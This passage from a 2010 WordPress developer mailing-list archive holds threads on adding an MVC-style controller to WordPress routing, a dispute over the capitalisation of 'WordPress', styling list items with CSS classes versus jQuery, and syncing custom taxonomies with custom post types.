I think I will have time to work on this late next week or the following weekend.

> ... WordPress tends to setup everything needed for the loop, whether it is needed or not.

Agreed! Whatever happens with routing I would love to see something changed so that when you don't need everything for the loop you don't have to get it.

-Mike

From wordpress at santosj.name  Sat Jul  3 01:33:26 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 02 Jul 2010 20:33:26 -0500
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <AE3A6EC8-121C-483F-A995-76E420A1C83F@newclarity.net>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
	<AE3A6EC8-121C-483F-A995-76E420A1C83F@newclarity.net>
Message-ID: <4C2E9366.9000901@santosj.name>

On 7/2/2010 6:43 PM, Mike Schinkel wrote:
> I wonder if swapping out the existing routing and replacing it with a "true" controller wouldn't change WordPress so fundamentally that is would in effect no longer be WordPress?
>    

WordPress isn't so much a controller as it is a blogging system and 
content management. If you replaced the controller with Zend Framework 
Controller, TinyMVC, etc, it would still be WordPress, just with a 
different implementation for the front controller. As for the plugins, 
it might be difficult to provide a similar system for them to work with. 
Not the best idea, but a custom solution would be tailored to 
WordPress's history and its current implementation. However, given that 
whenever you rewrite or replace something, you inevitably leave out 
certain cases that plugins use, it might be impossible to replace it 
completely at the beginning.

I'm actually not talking about replacing it, only complimenting it at 
this point, until at which time enough plugin / theme developers use the 
new system and it can be deprecated and the rest of the system designed 
to use the new one. However, given how simple my system is, I don't 
really think replacing the WordPress controller is required. Both 
systems can work together and even your implementation can be used in 
conjunction with my controller implementation.

> What I mean by that is WordPress is designed around the query where a URL(-like) query maps to a SQL query and WordPress sets lots of context flags based on the query.

I think that is one of the reasons for the complexity in WordPress. If 
the MVC was implemented correctly, from the beginning, then I believe it 
would be far different and easier than what it is now. MVC isn't about 
mapping URL to a query, it is about mapping the URL to a controller 
which handles the data. In this, you have a complex system that combines 
the Model with the Controller and simply loads the view, in a sort of 
business logic and presentation separation with front controller thrown 
in. I think that by separating it back out to using a controller for the 
different contexts, it will be faster and easier to understand. It 
should also be easier to extend and debug since anyone can look at it 
and not run with their tail in-between their legs or simply shake their 
heads thinking "WTF?"

> If we had a controller that bypassed the query then much of the core code and many of the plugins written for WordPress would be written on obsolete concepts and without a solid replacement for inspecting context.  IOW, using a controller would require us to add a new "context" system (and/or use the old one by complex mapping, but then what have you gained?)
>    

I think this is what we need to get away from. The controller doesn't 
bypass the query, it calls the query and then passes it off to the view. 
In this, the controller will own some of the responsibilities of the 
WP_Query in setting up the environment for the view and The Loop. 
However, this gets away from the short terms goals. It would require a 
mass amount of debate, testing, wrangling, strangling, and time to 
replace WP_Query, WP, and WP_Rewrite with a new system that both 
compatible and works. Well, it could be done in the two months, but I 
don't believe the powers that be will allow for such mass changes to the 
core. Furthermore, once the change has been implemented, it better be 
the best system ever, because it is unlikely to change for a long, long 
time. That and given that any new system is going to have its quirks, 
bugs, missing documentation, etc, it will be a few versions before it is 
really tested and ready for prime time.

The gain is a system where the MVC works as Zend Framework, CodeIgniter, 
etc work. It is unlikely that those programmers will pick up WordPress 
and develop and app with it, but it does allow for them to take on 
clients that decide to use WordPress and need to convert the code from 
those frameworks to WordPress. If the systems are similar, then all that 
should be required is creating new controllers and views for WordPress. 
It won't be a one to one, it never is for any framework system, but the 
learning curve will be much lower for those who are already used to 
those systems. Also, it goes a long way to allow for WordPress 
developers to pick up MVC frameworks in the event WordPress is not the 
best solution. I could name a few plugins that should never have been 
created using WordPress as the foundation or at least not in the way 
they made it.

> I am unsure how a URL controller could ever work within WordPress given all the existing plugins and the existing pool of knowledge and experience that people have regarding the way WordPress work today?
>    

It already works inside of WordPress, it just lacks the dispatcher. I 
mean, I could try adding the dispatcher in WordPress, but since it is DB 
based, it might be a bit difficult since plugin developers like to use 
array(&$this, 'method') and that won't work. It would require a new 
array structure. I'll see about adding it to the implementation and then 
people will be able to test it. However, I'm moving forward with my 
existing codebase with a few modifications based on the discussion here.

Really, what I want is the best solution and I don't believe I alone 
will come up with it. There exists many MVC libraries and frameworks, 
but majority of the existing ones are PHP5+ only and WordPress is still 
PHP4 compatible. If it is done right, then a plugin should be able to 
use the Zend Framework based on what exists currently in WordPress. The 
goal should be to ease the transition to either an existing PHP5 
Controller implementation in the future or a simple Controller in 
WordPress that eases some of the pain with working with it.

I don't think documentation will help because it still works differently 
than all the other Controller implementations and still has plenty of 
"WTF?". My goal is to hopefully ease that and I will have more to show 
come this weekend.

Jacob Santos

From mikeschinkel at newclarity.net  Sat Jul  3 02:38:25 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Fri, 2 Jul 2010 22:38:25 -0400
Subject: [wp-hackers] Controller Implementation
In-Reply-To: <4C2E9366.9000901@santosj.name>
References: <AANLkTin_SIZx059BF9mAJZRRoUkb-d1vbr_hiZjoIcyc@mail.gmail.com>
	<AE3A6EC8-121C-483F-A995-76E420A1C83F@newclarity.net>
	<4C2E9366.9000901@santosj.name>
Message-ID: <ACB5A075-E3C8-42F8-BCCB-BE6F07ECBD5F@newclarity.net>

At this point I think much of what you are attempting and I am attempting are orthogonal and frankly if I tried to grok it all at once I think my head might explode. :)  So I'm going to continue down the path I was working on and if my work or at least the concepts I work with have value to the core team maybe some of what I work on will make it into core.  Which is pretty much the same for your work, I guess. 

Whatever the case, I'm just glad that WordPress is far enough along that we can finally have the potential to address these URL routing issues.

-Mike

On Jul 2, 2010, at 9:33 PM, Jacob Santos wrote:

> On 7/2/2010 6:43 PM, Mike Schinkel wrote:
>> I wonder if swapping out the existing routing and replacing it with a "true" controller wouldn't change WordPress so fundamentally that is would in effect no longer be WordPress?
>>   
> 
> WordPress isn't so much a controller as it is a blogging system and content management. If you replaced the controller with Zend Framework Controller, TinyMVC, etc, it would still be WordPress, just with a different implementation for the front controller. As for the plugins, it might be difficult to provide a similar system for them to work with. Not the best idea, but a custom solution would be tailored to WordPress's history and its current implementation. However, given that whenever you rewrite or replace something, you inevitably leave out certain cases that plugins use, it might be impossible to replace it completely at the beginning.
> 
> I'm actually not talking about replacing it, only complimenting it at this point, until at which time enough plugin / theme developers use the new system and it can be deprecated and the rest of the system designed to use the new one. However, given how simple my system is, I don't really think replacing the WordPress controller is required. Both systems can work together and even your implementation can be used in conjunction with my controller implementation.
> 
>> What I mean by that is WordPress is designed around the query where a URL(-like) query maps to a SQL query and WordPress sets lots of context flags based on the query.
> 
> I think that is one of the reasons for the complexity in WordPress. If the MVC was implemented correctly, from the beginning, then I believe it would be far different and easier than what it is now. MVC isn't about mapping URL to a query, it is about mapping the URL to a controller which handles the data. In this, you have a complex system that combines the Model with the Controller and simply loads the view, in a sort of business logic and presentation separation with front controller thrown in. I think that by separating it back out to using a controller for the different contexts, it will be faster and easier to understand. It should also be easier to extend and debug since anyone can look at it and not run with their tail in-between their legs or simply shake their heads thinking "WTF?"
> 
>> If we had a controller that bypassed the query then much of the core code and many of the plugins written for WordPress would be written on obsolete concepts and without a solid replacement for inspecting context.  IOW, using a controller would require us to add a new "context" system (and/or use the old one by complex mapping, but then what have you gained?)
>>   
> 
> I think this is what we need to get away from. The controller doesn't bypass the query, it calls the query and then passes it off to the view. In this, the controller will own some of the responsibilities of the WP_Query in setting up the environment for the view and The Loop. However, this gets away from the short terms goals. It would require a mass amount of debate, testing, wrangling, strangling, and time to replace WP_Query, WP, and WP_Rewrite with a new system that both compatible and works. Well, it could be done in the two months, but I don't believe the powers that be will allow for such mass changes to the core. Furthermore, once the change has been implemented, it better be the best system ever, because it is unlikely to change for a long, long time. That and given that any new system is going to have its quirks, bugs, missing documentation, etc, it will be a few versions before it is really tested and ready for prime time.
> 
> The gain is a system where the MVC works as Zend Framework, CodeIgniter, etc work. It is unlikely that those programmers will pick up WordPress and develop and app with it, but it does allow for them to take on clients that decide to use WordPress and need to convert the code from those frameworks to WordPress. If the systems are similar, then all that should be required is creating new controllers and views for WordPress. It won't be a one to one, it never is for any framework system, but the learning curve will be much lower for those who are already used to those systems. Also, it goes a long way to allow for WordPress developers to pick up MVC frameworks in the event WordPress is not the best solution. I could name a few plugins that should never have been created using WordPress as the foundation or at least not in the way they made it.
> 
>> I am unsure how a URL controller could ever work within WordPress given all the existing plugins and the existing pool of knowledge and experience that people have regarding the way WordPress work today?
>>   
> 
> It already works inside of WordPress, it just lacks the dispatcher. I mean, I could try adding the dispatcher in WordPress, but since it is DB based, it might be a bit difficult since plugin developers like to use array(&$this, 'method') and that won't work. It would require a new array structure. I'll see about adding it to the implementation and then people will be able to test it. However, I'm moving forward with my existing codebase with a few modifications based on the discussion here.
> 
> Really, what I want is the best solution and I don't believe I alone will come up with it. There exists many MVC libraries and frameworks, but majority of the existing ones are PHP5+ only and WordPress is still PHP4 compatible. If it is done right, then a plugin should be able to use the Zend Framework based on what exists currently in WordPress. The goal should be to ease the transition to either an existing PHP5 Controller implementation in the future or a simple Controller in WordPress that eases some of the pain with working with it.
> 
> I don't think documentation will help because it still works differently than all the other Controller implementations and still has plenty of "WTF?". My goal is to hopefully ease that and I will have more to show come this weekend.
> 
> Jacob Santos
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers


From ash at thinkinginvain.com  Sat Jul  3 03:22:08 2010
From: ash at thinkinginvain.com (Ash Goodman)
Date: Sat, 3 Jul 2010 11:22:08 +0800
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 7
In-Reply-To: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
Message-ID: <AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>

Whether or not Matt's comment was reasonable, it could have and given
that it was Matt (the man in charge of WordPress) it should have been
handled better. For example, the question asked could have been
answered and then the request for the name change.

The way it was handled it came off as rude, selfish and arrogant. I am
not saying that was the intended outcome - I am sure it wasn't - but
it *was* the outcome.



On 3 July 2010 06:39,  <wp-hackers-request at lists.automattic.com> wrote:
>> On Fri, Jul 2, 2010 at 8:30 AM, Matt Mullenweg <m at mullenweg.com> wrote:
>>> Could you please change your name and email, and if you're going to use
>>> something so confusing at least capitalize the P correctly.
>>
>> I'll remove myself from the list. Thanks for the kind welcome, Matt.
>
> Uncalled for. Matt's request is entirely reasonable. Had he not said
> that first (timezones ftl), I probably would have too.

From mccormicky at gmail.com  Sat Jul  3 04:09:31 2010
From: mccormicky at gmail.com (mccormicky)
Date: Sat, 3 Jul 2010 00:09:31 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 7
In-Reply-To: <AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
Message-ID: <AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>

That guy who got all huffy did wrong when he  picked "Wordpress Developer"
to be his moniker.
How can you be a "WordPress Developer" if you don't even notice the P in the
name of the software  is capitalized?
And if I am not mistaken this kind of thing,misprint or oversight is the
exact reason that Matt either developed or commissioned a plugin that would
correct instances of WordPress being written any other way than WordPress. I
wish it were a Firefox addon! Sometimes it seems like so much work to hit
shift+p .
Ok, back to my weekend.



On Fri, Jul 2, 2010 at 11:22 PM, Ash Goodman <ash at thinkinginvain.com> wrote:

> Whether or not Matt's comment was reasonable, it could have and given
> that it was Matt (the man in charge of WordPress) it should have been
> handled better. For example, the question asked could have been
> answered and then the request for the name change.
>
> The way it was handled it came off as rude, selfish and arrogant. I am
> not saying that was the intended outcome - I am sure it wasn't - but
> it *was* the outcome.
>
>
>
> On 3 July 2010 06:39,  <wp-hackers-request at lists.automattic.com> wrote:
> >> On Fri, Jul 2, 2010 at 8:30 AM, Matt Mullenweg <m at mullenweg.com> wrote:
> >>> Could you please change your name and email, and if you're going to use
> >>> something so confusing at least capitalize the P correctly.
> >>
> >> I'll remove myself from the list. Thanks for the kind welcome, Matt.
> >
> > Uncalled for. Matt's request is entirely reasonable. Had he not said
> > that first (timezones ftl), I probably would have too.
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From wordpress at santosj.name  Sat Jul  3 04:57:35 2010
From: wordpress at santosj.name (Jacob Santos)
Date: Fri, 02 Jul 2010 23:57:35 -0500
Subject: [wp-hackers] Tracking changes for posts  >>>Re:  wp-hackers Digest,
 Vol 66, Issue 7
In-Reply-To: <AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
Message-ID: <4C2EC33F.9090602@santosj.name>

It is common netiquette to change the subject line of the Digest to that 
of what you are replying to. If in the event you want people to read 
what you have to write.

Jacob Santos

On 7/2/2010 10:22 PM, Ash Goodman wrote:

From kaf at szub.net  Sat Jul  3 05:58:05 2010
From: kaf at szub.net (Kaf Oseo)
Date: Sat, 03 Jul 2010 01:58:05 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 7
In-Reply-To: <AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
Message-ID: <4C2ED16D.9050907@szub.net>

mccormicky wrote:
> And if I am not mistaken this kind of thing,misprint or oversight is the
> exact reason that Matt either developed or commissioned a plugin that would
> correct instances of WordPress being written any other way than WordPress.

When I wrote W-P[1] - a long time ago it seems now, Matt most certainly 
did not commission it. ;)

-Kaf

1. http://guff.szub.net/2005/01/22/w-p/

From mccormicky at gmail.com  Sat Jul  3 08:10:14 2010
From: mccormicky at gmail.com (mccormicky)
Date: Sat, 3 Jul 2010 04:10:14 -0400
Subject: [wp-hackers] wp-hackers Digest, Vol 66, Issue 7
In-Reply-To: <4C2ED16D.9050907@szub.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net>
Message-ID: <AANLkTil-wSThSVukLsfGlXybnV_cjFFl9bhvfDmtPghi@mail.gmail.com>

Ha Ha! I beg your pardon!
Beating a dead horse:
http://wpengineer.com/spelling-wordpress-always-correctly/
 led  to
http://lorelle.wordpress.com/2009/01/29/wordpress-news-logogate-wordpresstv-wordpressmu-buddypress-and-more/
Lorelle could not intentionally mis-type WordPress because the correction
was built in to wordpress.com blogs.



On Sat, Jul 3, 2010 at 1:58 AM, Kaf Oseo <kaf at szub.net> wrote:

> mccormicky wrote:
>
>> And if I am not mistaken this kind of thing,misprint or oversight is the
>> exact reason that Matt either developed or commissioned a plugin that
>> would
>> correct instances of WordPress being written any other way than WordPress.
>>
>
> When I wrote W-P[1] - a long time ago it seems now, Matt most certainly did
> not commission it. ;)
>
> -Kaf
>
> 1. http://guff.szub.net/2005/01/22/w-p/
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From bulk at thecodecave.com  Sat Jul  3 11:28:34 2010
From: bulk at thecodecave.com (Brian Layman)
Date: Sat, 3 Jul 2010 07:28:34 -0400
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <4C2ED16D.9050907@szub.net>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net>
Message-ID: <001201cb1aa2$e1c9bd30$a55d3790$@com>

>> And if I am not mistaken this kind of thing,misprint or oversight is the
>> exact reason that Matt either developed or commissioned a plugin that
would
>> correct instances of WordPress being written any other way than
WordPress.
> When I wrote W-P[1] - a long time ago it seems now, Matt most certainly 
> did not commission it. ;)

Hah!  Now that's old school.

It's now a built in function at the end of formatting.php:

/**
 * Forever eliminate "Wordpress" from the planet (or at least the little bit
we can influence).
 *
 * Violating our coding standards for a good function name.
 *
 * @since 3.0.0
 */
function capital_P_dangit( $text ) {
       return str_replace( 'Wordpress', 'WordPress', $text );
}

______________________________________________
Brian Layman
eHermits, Inc.


From viniciusandre at gmail.com  Sat Jul  3 16:10:39 2010
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sat, 3 Jul 2010 13:10:39 -0300
Subject: [wp-hackers] Detailing content listing
Message-ID: <AANLkTikzF3v4q1ZwT2aI6B0zI0kNKgo3kDSDIAdprmiG@mail.gmail.com>

Hi!

I've been running through some problems while styling menu items
generated by `wp_list_pages` or `wp_list_categories`, mostly because
of the lack of classes that map things like odd, even, first or last.

Some workarounds with filters and jQuery were nicely done here, and
I'm also aware of the walker class and plugins that could potentially
personalize any of these listings, but couldn't some (or the most
used) features be easier and built-in as arguments for these
functions?

Thanks!
--
Vin?cius Massuchetto
http://vinicius.soylocoporti.org.br

From scribu at gmail.com  Sat Jul  3 18:11:54 2010
From: scribu at gmail.com (scribu)
Date: Sat, 3 Jul 2010 21:11:54 +0300
Subject: [wp-hackers] Synchronizing Custom Taxonomies with Custom Post
	Types?
In-Reply-To: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>
References: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>
Message-ID: <AANLkTinrDeUB2pIKZ7ppNQTL0_73RO7iUmexwXCfGbRm@mail.gmail.com>

On Fri, Jul 2, 2010 at 9:38 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> Has anyone worked with synchronizing custom taxonomies with custom post
> types?
>

I've tried and it didn't work out too well.


> I need to use a custom taxonomy to associate with a custom post type so
> that I can relate instances of the two custom post types in a many-to-many
> relationship and so I can use the taxonomy selector widget in the admin for
> existing UI.


For many-to-many relationships between posts, I have a little plugin that
uses the postmeta table to connect posts. Here are the wrapper functions:

http://plugins.trac.wordpress.org/browser/posts-to-posts/trunk/api.php?rev=249279


-- 
http://scribu.net

From scribu at gmail.com  Sat Jul  3 18:21:24 2010
From: scribu at gmail.com (scribu)
Date: Sat, 3 Jul 2010 21:21:24 +0300
Subject: [wp-hackers] Detailing content listing
In-Reply-To: <AANLkTikzF3v4q1ZwT2aI6B0zI0kNKgo3kDSDIAdprmiG@mail.gmail.com>
References: <AANLkTikzF3v4q1ZwT2aI6B0zI0kNKgo3kDSDIAdprmiG@mail.gmail.com>
Message-ID: <AANLkTil-DIH1_LPiF2J8R8NyyqMMYQku0sJSIANBBEyX@mail.gmail.com>

On Sat, Jul 3, 2010 at 7:10 PM, Vinicius Massuchetto <
viniciusandre at gmail.com> wrote:

> Hi!
>
> I've been running through some problems while styling menu items
> generated by `wp_list_pages` or `wp_list_categories`, mostly because
> of the lack of classes that map things like odd, even, first or last.
>

Come on, you need classes for odd, even, first or last? I thought we already
have CSS selectors for that.

If not, jQuery makes it easy enough.

We really don't need to bloat those functions any further, IMO.


-- 
http://scribu.net

From scribu at gmail.com  Sat Jul  3 18:23:58 2010
From: scribu at gmail.com (scribu)
Date: Sat, 3 Jul 2010 21:23:58 +0300
Subject: [wp-hackers] Custom post types filtering
In-Reply-To: <AANLkTil_gqS2ql56yG0DjaxTV3OTO2tUWQL14jUyRpB2@mail.gmail.com>
References: <b77132d2-2bf0-40d1-8c61-82201193f1a6@x27g2000yqb.googlegroups.com>
	<01336308-4de2-40b7-bbc5-2afb0ddb6739@i31g2000yqm.googlegroups.com>
	<AANLkTinsMTHrg738haKKd0QnhwcMmJ9Hk3y_Gww4TKfz@mail.gmail.com>
	<AANLkTil_gqS2ql56yG0DjaxTV3OTO2tUWQL14jUyRpB2@mail.gmail.com>
Message-ID: <AANLkTilf-3-0ZnHlZK8sW-11fLT7OnQOrSzX9exv9J4V@mail.gmail.com>

Jimmy Roy: http://wordpress.org/support/forum/3

-- 
http://scribu.net

From mikeschinkel at newclarity.net  Sat Jul  3 20:04:40 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 3 Jul 2010 16:04:40 -0400
Subject: [wp-hackers] Synchronizing Custom Taxonomies with Custom Post
	Types?
In-Reply-To: <AANLkTinrDeUB2pIKZ7ppNQTL0_73RO7iUmexwXCfGbRm@mail.gmail.com>
References: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>
	<AANLkTinrDeUB2pIKZ7ppNQTL0_73RO7iUmexwXCfGbRm@mail.gmail.com>
Message-ID: <EB42D639-2872-4907-A4EA-4A469550AAF4@newclarity.net>

On Jul 3, 2010, at 2:11 PM, scribu wrote:
> 
> I've tried and it didn't work out too well.

Care to elaborate?  What problems did you run into?  

My design for this project is already pretty much "baked" (thanks to wireframes from the clients; I could rebuild all the UI but really don't want to) so I'd really appreciate knowing the pitfalls you ran into.

> For many-to-many relationships between posts, I have a little plugin that
> uses the postmeta table to connect posts. Here are the wrapper functions:
> 
> http://plugins.trac.wordpress.org/browser/posts-to-posts/trunk/api.php?rev=249279

Thanks for the link, I'll definitely review it.


-Mike



From scribu at gmail.com  Sat Jul  3 20:18:36 2010
From: scribu at gmail.com (scribu)
Date: Sat, 3 Jul 2010 23:18:36 +0300
Subject: [wp-hackers] Synchronizing Custom Taxonomies with Custom Post
	Types?
In-Reply-To: <EB42D639-2872-4907-A4EA-4A469550AAF4@newclarity.net>
References: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>
	<AANLkTinrDeUB2pIKZ7ppNQTL0_73RO7iUmexwXCfGbRm@mail.gmail.com>
	<EB42D639-2872-4907-A4EA-4A469550AAF4@newclarity.net>
Message-ID: <AANLkTilyQmPrMgedjsU41-K94e0GMGk06SEVmPdXUKPl@mail.gmail.com>

On Sat, Jul 3, 2010 at 11:04 PM, Mike Schinkel
<mikeschinkel at newclarity.net>wrote:

> On Jul 3, 2010, at 2:11 PM, scribu wrote:
> >
> > I've tried and it didn't work out too well.
>
> Care to elaborate?  What problems did you run into?
>

Well, for one reason or another, the terms would get out of sync. I guess
part of the problem was that I was using a custom edit screen for one of the
post types (it was pre 3.0).

Also, it was pretty hard to query the relationships afterwards.


-- 
http://scribu.net

From viniciusandre at gmail.com  Sat Jul  3 20:26:07 2010
From: viniciusandre at gmail.com (Vinicius Massuchetto)
Date: Sat, 3 Jul 2010 17:26:07 -0300
Subject: [wp-hackers] Detailing content listing
In-Reply-To: <AANLkTil-DIH1_LPiF2J8R8NyyqMMYQku0sJSIANBBEyX@mail.gmail.com>
References: <AANLkTikzF3v4q1ZwT2aI6B0zI0kNKgo3kDSDIAdprmiG@mail.gmail.com>
	<AANLkTil-DIH1_LPiF2J8R8NyyqMMYQku0sJSIANBBEyX@mail.gmail.com>
Message-ID: <AANLkTikUkj74qkw_jvn_Uz_Gi6kHRwMEa8d6MT6SgoOQ@mail.gmail.com>

On Sat, Jul 3, 2010 at 3:21 PM, scribu <scribu at gmail.com> wrote:
> On Sat, Jul 3, 2010 at 7:10 PM, Vinicius Massuchetto <
> viniciusandre at gmail.com> wrote:
>
>> Hi!
>>
>> I've been running through some problems while styling menu items
>> generated by `wp_list_pages` or `wp_list_categories`, mostly because
>> of the lack of classes that map things like odd, even, first or last.
>>
>
> Come on, you need classes for odd, even, first or last?

No, I don't. I just would use PHP code to generate classes instead of
applying styles with jQuery if I could, and leaving the page rendering
the less possible "user-side".

> I thought we already
> have CSS selectors for that.

Unfortunately, IE does not support :first and other CSS selectors...
And I don't think it's nice to load jQuery just to apply some colors.

--
Vinicius Massuchetto
http://vinicius.soylocoporti.org.br

From jason at blueluna.com  Sat Jul  3 20:45:27 2010
From: jason at blueluna.com (Jason LeVan)
Date: Sat, 3 Jul 2010 16:45:27 -0400
Subject: [wp-hackers] Detailing content listing
In-Reply-To: <AANLkTikUkj74qkw_jvn_Uz_Gi6kHRwMEa8d6MT6SgoOQ@mail.gmail.com>
References: <AANLkTikzF3v4q1ZwT2aI6B0zI0kNKgo3kDSDIAdprmiG@mail.gmail.com>
	<AANLkTil-DIH1_LPiF2J8R8NyyqMMYQku0sJSIANBBEyX@mail.gmail.com>
	<AANLkTikUkj74qkw_jvn_Uz_Gi6kHRwMEa8d6MT6SgoOQ@mail.gmail.com>
Message-ID: <AANLkTikZe0ixG4XluZkJKIiZ5IBX0t0HcNv7X5YiO4oQ@mail.gmail.com>

On Sat, Jul 3, 2010 at 4:26 PM, Vinicius Massuchetto <
viniciusandre at gmail.com> wrote:

> On Sat, Jul 3, 2010 at 3:21 PM, scribu <scribu at gmail.com> wrote:
> > On Sat, Jul 3, 2010 at 7:10 PM, Vinicius Massuchetto <
> > viniciusandre at gmail.com> wrote:
> >
> >> Hi!
> >>
> >> I've been running through some problems while styling menu items
> >> generated by `wp_list_pages` or `wp_list_categories`, mostly because
> >> of the lack of classes that map things like odd, even, first or last.
> >>
> >
> > Come on, you need classes for odd, even, first or last?
>
> No, I don't. I just would use PHP code to generate classes instead of
> applying styles with jQuery if I could, and leaving the page rendering
> the less possible "user-side".
>
> > I thought we already
> > have CSS selectors for that.
>
> Unfortunately, IE does not support :first and other CSS selectors...
> And I don't think it's nice to load jQuery just to apply some colors.
>
> One could also argue that it's not nice to run unnecessary loops just to
cater to styling a browser without updated CSS support, and that needing to
add extra classes to the HTML just to apply extra colors is extraneous
markup.

Bottom line, you have to use a "messy" solution either way to have these
selectors cross browser, either extra markup and loops in your PHP, or using
jQuery(or vanilla javascript if you need a more lean solution) - although
using Google's CDN for jQuery will mean that most users have the jQuery
library cached already anyway.

-- 
???????
jason levan
BlueLuna

617.938.3944 x709
www.blueluna.com

From johnbillion+wp at gmail.com  Sat Jul  3 21:42:03 2010
From: johnbillion+wp at gmail.com (John Blackbourn)
Date: Sat, 3 Jul 2010 22:42:03 +0100
Subject: [wp-hackers] Putting the P in WordPress
In-Reply-To: <001201cb1aa2$e1c9bd30$a55d3790$@com>
References: <mailman.9189.1278110397.1338.wp-hackers@lists.automattic.com>
	<AANLkTikZRF9A08Faf6mjZ46TRHx3O6Z6CtNyP__Bxx4D@mail.gmail.com>
	<AANLkTimnYIO08tTY4ejTwXMu66Es0cVSfKixTWPipz9Q@mail.gmail.com>
	<4C2ED16D.9050907@szub.net> <001201cb1aa2$e1c9bd30$a55d3790$@com>
Message-ID: <AANLkTikAfcLyJEVAQ2lREq1Vk97HLrx1DQGyYZVZrpEc@mail.gmail.com>

There's some discussion here around problems that this feature may
cause some people: http://core.trac.wordpress.org/ticket/13971

On Sat, Jul 3, 2010 at 12:28 PM, Brian Layman <bulk at thecodecave.com> wrote:
>>> And if I am not mistaken this kind of thing,misprint or oversight is the
>>> exact reason that Matt either developed or commissioned a plugin that
> would
>>> correct instances of WordPress being written any other way than
> WordPress.
>> When I wrote W-P[1] - a long time ago it seems now, Matt most certainly
>> did not commission it. ;)
>
> Hah! ?Now that's old school.
>
> It's now a built in function at the end of formatting.php:
>
> /**
> ?* Forever eliminate "Wordpress" from the planet (or at least the little bit
> we can influence).
> ?*
> ?* Violating our coding standards for a good function name.
> ?*
> ?* @since 3.0.0
> ?*/
> function capital_P_dangit( $text ) {
> ? ? ? return str_replace( 'Wordpress', 'WordPress', $text );
> }
>
> ______________________________________________
> Brian Layman
> eHermits, Inc.
>
> _______________________________________________
> wp-hackers mailing list
> wp-hackers at lists.automattic.com
> http://lists.automattic.com/mailman/listinfo/wp-hackers
>

From mikeschinkel at newclarity.net  Sat Jul  3 22:45:09 2010
From: mikeschinkel at newclarity.net (Mike Schinkel)
Date: Sat, 3 Jul 2010 18:45:09 -0400
Subject: [wp-hackers] Synchronizing Custom Taxonomies with Custom Post
	Types?
In-Reply-To: <AANLkTilyQmPrMgedjsU41-K94e0GMGk06SEVmPdXUKPl@mail.gmail.com>
References: <687AF599-FFF8-44E8-AEAC-5BFD28FCD883@newclarity.net>
	<AANLkTinrDeUB2pIKZ7ppNQTL0_73RO7iUmexwXCfGbRm@mail.gmail.com>
	<EB42D639-2872-4907-A4EA-4A469550AAF4@newclarity.net>
	<AANLkTilyQmPrMgedjsU41-K94e0GMGk06SEVmPdXUKPl@mail.gmail.com>
Message-ID: <2A904D10-1439-4422-A15A-19AD309DB1F3@newclarity.net>

On Jul 3, 2010, at 4:18 PM, scribu wrote:
>>> I've tried and it didn't work out too well.
>> 
>> Care to elaborate?  What problems did you run into?
> 
> Well, for one reason or another, the terms would get out of sync. I guess
> part of the problem was that I was using a custom edit screen for one of the
> post types (it was pre 3.0).

Yes, I could see that.  

Did you disable the standard term editing screen?  For this project we plan to do that.

Hmm.  I wonder if it is really harder to do this than to use custom fields; i.e. wouldn't custom fields potentially get out of sync too?  
> 
> Also, it was pretty hard to query the relationships afterwards.

Fortunately I've got no problem with that (already doing it successfully.)

Thanks again.

-Mike

P.S. Regarding using custom fields, I'm having a concern with using an unindexed longtext field (meta_value) to store database foreign keys. I don't know what level of scale that would start causing problems for use cases where you are looking up the post given the related field. I wonder how long before it became a bottleneck?  I ask per chance others agree and if so to discuss how to improve meta for use with parent-child key use cases?


